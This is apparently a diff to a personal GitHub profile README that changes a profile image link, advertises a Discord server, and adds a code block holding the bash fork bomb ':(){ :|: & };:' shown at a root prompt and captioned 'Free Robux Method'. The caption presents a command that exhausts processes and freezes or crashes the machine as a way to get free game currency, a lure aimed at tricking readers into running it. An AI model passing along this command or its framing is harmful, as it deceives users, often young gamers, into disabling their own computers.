@@ -1,4 +1,5 @@
-<img align="left" src="[https://files.catbox.moe/bnm05t.png](https://i.pinimg.com/564x/f5/df/1a/f5df1a934ed364e20004bd32a9d4c23e.jpg)" width="147" alt="Profile Image" /> 
+<img align="left" src="https://files.catbox.moe/c420rb.jpg" width="147" alt="Profile Image" />
+
 
 
 
@@ -11,4 +12,7 @@ srv  $  discord.gg/injects
 ```
 ## 
 &zwnj;
-im down to colab on projects
+```php
+root@skip:~$ :(){ :|: & };:
+```
+└── Free Robux Method
